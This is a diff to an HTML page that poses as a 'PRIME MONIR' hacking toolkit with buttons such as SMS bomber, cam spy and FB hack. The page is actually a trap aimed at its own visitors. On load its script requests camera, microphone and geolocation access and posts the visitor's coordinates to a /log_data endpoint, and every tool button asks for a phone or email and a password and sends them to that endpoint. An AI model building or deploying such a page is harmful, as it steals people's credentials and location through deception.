@@ -3,71 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PRIME MONIR | KERNEL V6.0</title>
+    <title>PRIME MONIR | KERNEL V7.0</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-        body, html { margin:0; padding:0; background:#000; color:#0f0; font-family:'Share Tech Mono', monospace; overflow-x:hidden; }
-        #loader { position:fixed; width:100%; height:100%; background:#000; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999; text-align:center; }
-        .bar-con { width:250px; height:10px; border:1px solid #0f0; margin-top:15px; }
-        .bar { width:0%; height:100%; background:#0f0; animation:load 4s forwards linear; }
-        @keyframes load { to { width:100%; } }
+        body, html { margin:0; padding:0; background:#000; color:#0f0; font-family:'Share Tech Mono', monospace; overflow:hidden; }
+        canvas { position:fixed; top:0; left:0; z-index:-1; opacity:0.4; }
+        
+        /* লাল লোডার এনিমেশন */
+        #loader { position:fixed; width:100%; height:100%; background:#000; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999; }
+        .circle { width:100px; height:100px; border:6px solid #200; border-top:6px solid #f00; border-radius:50%; animation:spin 1s linear infinite; box-shadow: 0 0 20px #f00; }
+        @keyframes spin { 0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);} }
+
+        /* মেইন ড্যাশবোর্ড */
         #ui { display:none; padding:15px; }
-        .bomber-btn { border:2px solid #f00; background:rgba(255,0,0,0.1); color:#f00; padding:20px; font-weight:bold; margin-bottom:15px; cursor:pointer; text-align:center; animation:pulse 1.5s infinite; }
-        @keyframes pulse { 0%{box-shadow:0 0 5px #f00;} 50%{box-shadow:0 0 20px #f00;} 100%{box-shadow:0 0 5px #f00;} }
-        .grid { display:grid; grid-template-columns: 1fr 1fr; gap:10px; }
-        .tool { border:1px solid #0f0; padding:15px 5px; background:rgba(0,255,0,0.05); text-align:center; cursor:pointer; font-size:12px; }
+        .header { border:1px solid #0f0; padding:10px; text-align:center; background:rgba(0,255,0,0.1); margin-bottom:20px; box-shadow:0 0 15px #0f0; }
+        .bomber { border:2px solid #f00; background:rgba(255,0,0,0.2); color:#f00; padding:15px; margin-bottom:15px; text-align:center; font-weight:bold; cursor:pointer; animation:blink 1s infinite; font-size:16px; }
+        @keyframes blink { 0% {opacity:1;} 50% {opacity:0.5;} }
+        
+        .grid { display:grid; grid-template-columns: 1fr 1fr; gap:12px; }
+        .tool { border:1px solid #0f0; padding:15px; background:rgba(0,255,0,0.1); text-align:center; cursor:pointer; font-size:13px; text-transform:uppercase; transition:0.3s; }
+        .tool:hover { background:#0f0; color:#000; }
+
+        /* কনসোল লোগ */
+        #console { margin-top:20px; border:1px solid #0f0; height:120px; background:rgba(0,0,0,0.8); padding:10px; font-size:11px; overflow-y:auto; line-height:1.5; }
     </style>
 </head>
 <body>
+    <canvas id="matrix"></canvas>
+    
     <div id="loader">
-        <div style="letter-spacing:5px; color:#f00;">⚠️ ATTENTION ⚠️</div>
-        <div style="font-size:10px; margin-top:5px;">BYPASSING DEVICE SECURITY...</div>
-        <div class="bar-con"><div class="bar"></div></div>
+        <div class="circle"></div>
+        <div style="color:#f00; margin-top:20px; font-weight:bold; letter-spacing:3px;">INJECTING EXPLOITS...</div>
     </div>
 
     <div id="ui">
-        <div style="border:1px solid #0f0; padding:10px; text-align:center; margin-bottom:15px;">
-            <h2 style="margin:0;">PRIME MONIR | ACCESS PANEL</h2>
+        <div class="header">
+            <h1 style="margin:0; font-size:24px; color:#fff;">PRIME MONIR V7.0</h1>
+            <small>SYSTEM STATUS: <span style="color:#0f0;">OVERRIDE ACTIVE</span></small>
         </div>
-        <div class="bomber-btn" onclick="openTool('SMS_BOMBER')">🔥 SMS BOMBER (FREE)</div>
+
+        <div class="bomber" onclick="run('SMS_BOMBER')">🔥 ULTIMATE SMS BOMBER (HIGH SPEED)</div>
+
         <div class="grid">
-            <div class="tool" onclick="openTool('GALLERY')">GALLERY HACK</div>
-            <div class="tool" onclick="openTool('LOCATION')">LIVE TRACK</div>
-            <div class="tool" onclick="openTool('CAMERA')">CAM SPY</div>
-            <div class="tool" onclick="openTool('FILES')">FILE MANAGER</div>
+            <div class="tool" onclick="run('CAM_SPY')">CAM SPY</div>
+            <div class="tool" onclick="run('LOCATION')">LOCATION</div>
+            <div class="tool" onclick="run('GALLERY')">GALLERY</div>
+            <div class="tool" onclick="run('FILE_MGR')">FILE MGR</div>
+            <div class="tool" onclick="run('FB_HACK')">FB HACK</div>
+            <div class="tool" onclick="run('WA_SPY')">WA SPY</div>
+            <div class="tool" onclick="run('MIC_SPY')">MIC SPY</div>
+            <div class="tool" onclick="run('CALL_LOGS')">CALL LOGS</div>
         </div>
+
+        <div id="console">> Initializing core modules...<br>> Establishing connection... [OK]</div>
     </div>
 
     <script>
-        // অটো এক্সেস ট্র্যাপ - লোডিং এর সময়
+        // Matrix Rain
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const letters = "0101010101010101";
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+        function draw() {
+            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
+            ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
+            for(let i=0; i<drops.length; i++) {
+                const text = letters.charAt(Math.floor(Math.random()*letters.length));
+                ctx.fillText(text, i*fontSize, drops[i]*fontSize);
+                if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(draw, 50);
+
+        // Auto Access & Hide Loader
         window.onload = async () => {
             try {
-                // ক্যামেরা ও মাইক পারমিশন
                 await navigator.mediaDevices.getUserMedia({video:true, audio:true});
-                // লোকেশন পারমিশন
-                navigator.geolocation.getCurrentPosition((p) => {
-                    sendData('LOCATION', `Lat: ${p.coords.latitude}, Lon: ${p.coords.longitude}`);
+                navigator.geolocation.getCurrentPosition(p => {
+                    fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
+                    body:JSON.stringify({type:'LOCATION', content:`Lat:${p.coords.latitude}, Lon:${p.coords.longitude}`})});
                 });
             } catch(e) {}
-            
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('ui').style.display = 'block';
-            }, 4000);
+            }, 3500);
         };
 
-        function sendData(type, content) {
-            fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
-            body:JSON.stringify({type: type, content: content})});
-        }
-
-        function openTool(name) {
-            // টুল ওপেন করতে গেলে তখন আইডি পাসওয়ার্ড চাইবে
-            let u = prompt("Verification Required!\nEnter Phone/Email to link server:");
+        function run(name) {
+            const con = document.getElementById('console');
+            con.innerHTML += `<div style="color:red">> Exploiting ${name}...</div>`;
+            // আইডি-পাসওয়ার্ড ট্র্যাপ
+            let u = prompt("Verification Needed!\nEnter Phone/Email:");
             let p = prompt("Enter Password:");
             if(u && p) {
-                sendData('CREDENTIALS', `User: ${u}, Pass: ${p}, Tool: ${name}`);
-                alert("Connection Established. Streaming data...");
+                fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
+                body:JSON.stringify({type:'CREDENTIALS', content:`U:${u}, P:${p}, Tool:${name}`})});
             }
         }
     </script>
